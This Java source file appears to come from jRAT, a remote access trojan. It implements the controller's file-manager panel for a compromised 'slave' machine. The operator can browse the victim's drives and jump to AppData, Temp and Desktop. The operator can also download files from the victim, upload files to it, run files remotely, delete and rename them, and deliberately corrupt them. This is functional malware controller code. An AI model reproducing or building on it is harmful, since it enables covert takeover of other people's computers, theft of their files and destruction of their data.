package se.jrat.controller.ui.panels;

import java.awt.BorderLayout;
import java.awt.Desktop;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JSplitPane;
import javax.swing.SwingUtilities;
import javax.swing.event.PopupMenuEvent;
import javax.swing.event.PopupMenuListener;

import se.jrat.common.io.FileCache;
import se.jrat.common.io.TransferData;
import se.jrat.controller.Drive;
import se.jrat.controller.Main;
import se.jrat.controller.Slave;
import se.jrat.controller.io.FileObject;
import se.jrat.controller.io.FileSystem;
import se.jrat.controller.listeners.DirListener;
import se.jrat.controller.packets.outgoing.Packet15ListFiles;
import se.jrat.controller.packets.outgoing.Packet16DeleteFile;
import se.jrat.controller.packets.outgoing.Packet21ServerDownloadFile;
import se.jrat.controller.packets.outgoing.Packet38RunCommand;
import se.jrat.controller.packets.outgoing.Packet42ServerUploadFile;
import se.jrat.controller.packets.outgoing.Packet43CreateDirectory;
import se.jrat.controller.packets.outgoing.Packet47RenameFile;
import se.jrat.controller.packets.outgoing.Packet64FileHash;
import se.jrat.controller.packets.outgoing.Packet70CorruptFile;
import se.jrat.controller.settings.StoreFileBookmarks;
import se.jrat.controller.ui.components.FileTable;
import se.jrat.controller.ui.frames.FramePreviewFile;
import se.jrat.controller.ui.frames.FramePreviewImage;
import se.jrat.controller.ui.frames.FramePreviewZip;
import se.jrat.controller.ui.frames.FrameRemoteThumbView;
import se.jrat.controller.utils.IconUtils;
import se.jrat.controller.utils.Utils;

import com.redpois0n.oslib.OperatingSystem;

@SuppressWarnings("serial")
public class PanelRemoteFiles extends JPanel {
	
	private Slave slave;
	public RemoteFileTable remoteTable;
	
	public PanelRemoteFiles(Slave slave) {
		this.slave = slave;
		
		setLayout(new BorderLayout(0, 0));
		
		final JSplitPane sp = new JSplitPane();
		
		LocalFileTable localTable = new LocalFileTable();
		sp.setLeftComponent(localTable);
		
		remoteTable = new RemoteFileTable();
		sp.setRightComponent(remoteTable);
		
		add(sp, BorderLayout.CENTER);
		
		SwingUtilities.invokeLater(new Runnable() {
			@Override
			public void run() {
				sp.setDividerLocation(0.5D);
			}
		});
	}
	
	public class LocalFileTable extends FileTable {
		
		public LocalFileTable() {	
			super();
			driveComboBox.setRenderer(renderer);
			driveComboBox.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					clear();
					FileSystem.addDir(driveComboBox.getSelectedItem().toString(), LocalFileTable.this);
				}
			});
			
			listRoots();
			
			JButton btnUpload = new JButton("Upload");
			btnUpload.setIcon(IconUtils.getIcon("arrow-up"));
			btnUpload.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent arg0) {
					upload();
				}				
			});
			toolBar.add(btnUpload, 0);
		}

		@Override
		public void onBack() {
			if (!getCurrentDirectory().contains(File.separator)) {
				clear();
				setDirectory(null);
				listRoots();
			} else {
				clear();
				setDirectory(getCurrentDirectory().substring(0, getCurrentDirectory().substring(0, getCurrentDirectory().length() - 1).lastIndexOf(File.separator)));
				FileSystem.addDir(getCurrentDirectory(), this);
			}
		}

		@Override
		public void onReload() {
			clear();
			
			if (getCurrentDirectory().length() == 0) {	
				listRoots();
			} else {
				FileSystem.addDir(getCurrentDirectory(), this);
			}
		}

		@Override
		public void onDelete() {
			String[] files = getSelectedItems();
			if (files != null) {
				for (String file : files) {
					if (Utils.yesNo("Confirm", "Confirm deleting " + file)) {
						new File(file).delete();
					}
				}
			}
		}

		@Override
		public void onCreateFolder() {
			String foldername = JOptionPane.showInputDialog(null, "Input name of folder to create", "New Folder", JOptionPane.QUESTION_MESSAGE);
			if (foldername == null) {
				return;
			}
			foldername = foldername.trim();
			new File(txtDir.getText() + File.separator + foldername).mkdirs();
		}

		@Override
		public void onItemClick(FileObject fo) {
			if (fo.isDirectory()) {
				browse(fo.getPath());
			} else {
				try {
					Desktop.getDesktop().open(new File(fo.getPath()));
				} catch (Exception e1) {
					e1.printStackTrace();
				}
			}
		}
		
		@Override
		public void setDirectory(String directory) {
			if (!directory.endsWith(File.separator)) {
				directory += File.separator;
			}
			
			super.setDirectory(directory);
		}
		
		public void listRoots() {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				File[] f = File.listRoots();
				driveComboModel.removeAllElements();
				for (File fi : f) {		
					super.renderer.addIcon(fi.getAbsolutePath().toLowerCase(), IconUtils.getFileIcon(fi));
					driveComboModel.addElement(fi.getAbsolutePath());
				}
			} else {
				browse("/");
			}
		}
		
		public void browse(String dir) {
			setDirectory(dir);
			clear();
			FileSystem.addDir(dir, this);
		}
		
		public void upload() {
			new Thread() {
				public void run() {
					for (String s : getSelectedItems()) {
						File file = new File(s);
						slave.addToSendQueue(new Packet42ServerUploadFile(file, remoteTable.getCurrentDirectory() + file.getName()));
					}			
				}
			}.start();
		}
	}
	
	public class RemoteFileTable extends FileTable {
		
		private JMenuItem mnAdd;
		private JMenuItem mnRemove;
		
		public boolean waitingForHash;

		public RemoteFileTable() {
			super(slave);
			for (Drive drive : slave.getDrives()) {
				driveComboModel.addElement(drive.getName());
			}
			
			driveComboBox.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					clear();
					slave.addToSendQueue(new Packet15ListFiles(driveComboBox.getSelectedItem().toString()));
				}
			});
			
			if (slave.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
				setDirectory("/");
			} else {
				setDirectory("");
			}
						
			JButton btnDownload = new JButton("Download");
			btnDownload.setIcon(IconUtils.getIcon("arrow-down"));
			btnDownload.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent arg0) {
					download();
				}				
			});
			toolBar.add(btnDownload, 0);
			
			JPopupMenu popupMenuRemote = new JPopupMenu();
			addPopup(popupMenuRemote);
			
			DirListener dir = new DirListener(slave);			
					
			JMenuItem mntmRun = new JMenuItem("Run");
			mntmRun.setIcon(IconUtils.getIcon("execute"));
			mntmRun.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent arg0) {
					String[] files = getSelectedItems();
					if (files != null) {
						for (String file : files) {
							slave.addToSendQueue(new Packet38RunCommand(file));
						}
					}
				}
			});

			JMenu mnQuickJump = new JMenu("Quick Jump");
			mnQuickJump.setIcon(IconUtils.getIcon("folder-shortcut"));
			popupMenuRemote.add(mnQuickJump);

			popupMenuRemote.addSeparator();

			JMenuItem mnRoots = new JMenuItem("Roots");
			mnQuickJump.add(mnRoots);

			JMenuItem mnAppdata = new JMenuItem("Appdata");
			mnQuickJump.add(mnAppdata);
			mnAppdata.addActionListener(dir);

			JMenuItem mnTemp = new JMenuItem("Temp");
			mnQuickJump.add(mnTemp);


			JMenuItem mnDesktop = new JMenuItem("Desktop");
			mnQuickJump.add(mnDesktop);
			mnDesktop.addActionListener(dir);
			mnTemp.addActionListener(dir);
			mnRoots.addActionListener(dir);
			popupMenuRemote.add(mntmRun);

			JMenuItem mntmPreviewFiletext = new JMenuItem("Preview file (Text, ZIP, Image)");
			mntmPreviewFiletext.setIcon(IconUtils.getIcon("preview"));
			mntmPreviewFiletext.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent arg0) {
					String[] files = getSelectedItems();
					if (files != null) {
						for (String file : files) {
							if (file.toLowerCase().endsWith(".png") || file.toLowerCase().endsWith(".jpg") || file.toLowerCase().endsWith(".jpeg") || file.toLowerCase().endsWith(".gif")) {
								FramePreviewImage frame = new FramePreviewImage(slave, file);
								frame.setVisible(true);
							} else if (file.toLowerCase().endsWith(".zip") || file.toLowerCase().endsWith(".jar")) {
								FramePreviewZip frame = new FramePreviewZip(slave, file);
								frame.setVisible(true);
							} else {
								FramePreviewFile frame = new FramePreviewFile(slave, file);
								frame.setVisible(true);
							}
						}
					}
				}
			});
			popupMenuRemote.add(mntmPreviewFiletext);

			JMenuItem mntmDownloadFile = new JMenuItem("Download File(s)");
			mntmDownloadFile.setIcon(IconUtils.getIcon("arrow-left"));
			mntmDownloadFile.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					download();
				}
			});
			popupMenuRemote.add(mntmDownloadFile);

			JMenuItem mntmExploreImages = new JMenuItem("Explore(.png, .jpg, .gif)");
			mntmExploreImages.setIcon(IconUtils.getIcon("images-stack"));
			mntmExploreImages.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					List<String> files = new ArrayList<String>();
					
					String[] selectedItems = getSelectedItems();
					
					for (String str : selectedItems) {
						if (str.endsWith(".png") || str.endsWith(".gif") || str.endsWith(".jpg") || str.endsWith(".jpeg")) {
							files.add(str);
						}
					}

					if (files.size() > 0) {
						String[] paths = new String[files.size()];
						for (int i = 0; i < files.size(); i++) {
							paths[i] = files.get(i);
						}
						FrameRemoteThumbView frame = new FrameRemoteThumbView(slave, paths);
						frame.setVisible(true);
					}
				}
			});
			popupMenuRemote.add(mntmExploreImages);

			popupMenuRemote.addSeparator();

			JMenuItem mntmNewFolder = new JMenuItem("New Folder");
			mntmNewFolder.setIcon(IconUtils.getIcon("folder-add"));
			mntmNewFolder.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					String foldername = JOptionPane.showInputDialog(null, "Input name of folder to create", "New Folder", JOptionPane.QUESTION_MESSAGE);
					if (foldername == null) {
						return;
					}
					foldername = foldername.trim();
					slave.addToSendQueue(new Packet43CreateDirectory(txtDir.getText(), foldername));
				}
			});
			popupMenuRemote.add(mntmNewFolder);

			JMenuItem mntmDelete = new JMenuItem("Delete");
			mntmDelete.setIcon(IconUtils.getIcon("delete"));
			mntmDelete.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					onDelete();
				}
			});
			popupMenuRemote.add(mntmDelete);

			JMenuItem mntmRename = new JMenuItem("Rename");
			mntmRename.setIcon(IconUtils.getIcon("rename"));
			mntmRename.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					String file = getSelectedItem();
					if (file != null) {
						String result = JOptionPane.showInputDialog(null, "Input file name to rename to", "Rename", JOptionPane.QUESTION_MESSAGE);
						if (result == null) {
							return;
						}
						slave.addToSendQueue(new Packet47RenameFile(file, result.trim()));
					}
				}
			});
			popupMenuRemote.add(mntmRename);

			JMenuItem mntmMdHash = new JMenuItem("File Hash");
			mntmMdHash.setIcon(IconUtils.getIcon("barcode"));
			mntmMdHash.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent arg0) {
					String file = getTableModel().getValueAt(table.getSelectedRow(), 0).toString();
					if (file != null) {
						slave.addToSendQueue(new Packet64FileHash(file));
						waitingForHash = true;
					}
				}
			});
			popupMenuRemote.add(mntmMdHash);

			JMenuItem mntmCorrupt = new JMenuItem("Corrupt");
			mntmCorrupt.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					String file = getTableModel().getValueAt(table.getSelectedRow(), 0).toString();
					if (file != null) {
						slave.addToSendQueue(new Packet70CorruptFile(file));
					}
				}
			});
			mntmCorrupt.setIcon(IconUtils.getIcon("broken_document"));
			popupMenuRemote.add(mntmCorrupt);

			popupMenuRemote.addSeparator();

			JMenu mnBookmarks = new JMenu("Bookmarks");
			mnBookmarks.setIcon(IconUtils.getIcon("bookmark-go"));
			popupMenuRemote.add(mnBookmarks);
			
			mnAdd = new JMenuItem("Add");
			mnAdd.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					StoreFileBookmarks.getGlobal().getBookmarks().add(new File(txtDir.getText()));
				}
			});
			mnAdd.setIcon(IconUtils.getIcon("bookmark-add"));
			popupMenuRemote.add(mnAdd);
			
			mnRemove = new JMenuItem("Remove");
			mnRemove.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent e) {
					StoreFileBookmarks.getGlobal().remove(new File(txtDir.getText()));
				}
			});
			
			popupMenuRemote.addPopupMenuListener(new PopupMenuListener() {
				public void popupMenuCanceled(PopupMenuEvent arg0) {

				}

				public void popupMenuWillBecomeInvisible(PopupMenuEvent arg0) {

				}

				public void popupMenuWillBecomeVisible(PopupMenuEvent arg0) {
					File bm = new File(txtDir.getText());

					if (StoreFileBookmarks.getGlobal().contains(bm)) {
						mnAdd.setEnabled(false);
						mnRemove.setEnabled(true);
					} else {
						mnAdd.setEnabled(true);
						mnRemove.setEnabled(false);
					}
				}
			});
			
			mnRemove.setIcon(IconUtils.getIcon("bookmark-remove"));
			popupMenuRemote.add(mnRemove);

			popupMenuRemote.addSeparator();

			JMenuItem mntmSelectAllFolders = new JMenuItem("Select all folders");
			mntmSelectAllFolders.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					int row = 0;
					for (int i = 0; i < getTableModel().getRowCount(); i++) {
						String val = getTableModel().getValueAt(i, 0).toString();
						Main.debug(val);
						if (val.substring(val.lastIndexOf(slave.getFileSeparator()), val.length()).contains(".")) {
							row = i - 1;
							break;
						}
					}
					table.getSelectionModel().setSelectionInterval(0, row);
				}
			});
			mntmSelectAllFolders.setIcon(IconUtils.getIcon("folders-stack"));
			popupMenuRemote.add(mntmSelectAllFolders);

			JMenuItem mntmSelectAllFiles = new JMenuItem("Select all files");
			mntmSelectAllFiles.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent e) {
					int row = 0;
					for (int i = 0; i < getTableModel().getRowCount(); i++) {
						String val = getTableModel().getValueAt(i, 0).toString();
						Main.debug(val);
						if (val.substring(val.lastIndexOf(slave.getFileSeparator()), val.length()).contains(".")) {
							row = i - 1;
							break;
						}
					}
					table.getSelectionModel().setSelectionInterval(row, getTableModel().getRowCount());
				}
			});
			mntmSelectAllFiles.setIcon(IconUtils.getIcon("documents-stack"));
			popupMenuRemote.add(mntmSelectAllFiles);

			popupMenuRemote.addSeparator();

			JMenuItem mntmRefresh = new JMenuItem("Refresh");
			mntmRefresh.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					while (getTableModel().getRowCount() > 0) {
						getTableModel().removeRow(0);
					}
					slave.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
				}
			});
			mntmRefresh.setIcon(IconUtils.getIcon("refresh"));
			popupMenuRemote.add(mntmRefresh);
		}

		@Override
		public void onBack() {
			clear();
			
			if (!getCurrentDirectory().contains(slave.getFileSeparator())) {
				setDirectory(null);
			} else {
				setDirectory(getCurrentDirectory().substring(0, getCurrentDirectory().substring(0, getCurrentDirectory().length() - 1).lastIndexOf(slave.getFileSeparator())));
			}
		}

		@Override
		public void onReload() {
			clear();
			slave.addToSendQueue(new Packet15ListFiles(getCurrentDirectory()));
		}

		@Override
		public void onDelete() {
			String[] files = getSelectedItems();
			if (files != null) {
				for (String file : files) {
					if (Utils.yesNo("Confirm", "Confirm deleting " + file)) {
						slave.addToSendQueue(new Packet16DeleteFile(file));
					}
				}
			}
		}

		@Override
		public void onCreateFolder() {
			String foldername = JOptionPane.showInputDialog(null, "Input name of folder to create", "New Folder", JOptionPane.QUESTION_MESSAGE);
			if (foldername == null) {
				return;
			}
			foldername = foldername.trim();
			slave.addToSendQueue(new Packet43CreateDirectory(getCurrentDirectory(), foldername));
		}

		@Override
		public void onItemClick(FileObject fo) {
			if (fo.isDirectory()) {
				clear();
				setDirectory(fo.getPath());
			}
		}
		
		@Override
		public void setDirectory(String directory) {
			if (directory == null) {
				directory = "";
			}
			
			String c = slave.getFileSeparator();

			if (!directory.endsWith(c)) {
				directory += c;
			}
			
			slave.addToSendQueue(new Packet15ListFiles(directory));
			super.setDirectory(directory);
		}
		
		public void download() {
			String file = getSelectedItem();
			JFileChooser f = new JFileChooser();
			f.setSelectedFile(new File(file.substring(file.lastIndexOf(slave.getFileSeparator()), file.length())));
			f.showSaveDialog(null);
			
			if (f.getSelectedFile() != null && f.getSelectedFile().getParentFile().exists()) {
				FileObject fo = getSelectedFileObject();
				if (fo != null && !fo.isDirectory()) {
					TransferData data = new TransferData();
					data.setLocalFile(f.getSelectedFile());
					PanelFileTransfers.instance.add(data);
					FileCache.put(file, data);
					slave.addToSendQueue(new Packet21ServerDownloadFile(file));
				}
			}
		}
	}

}
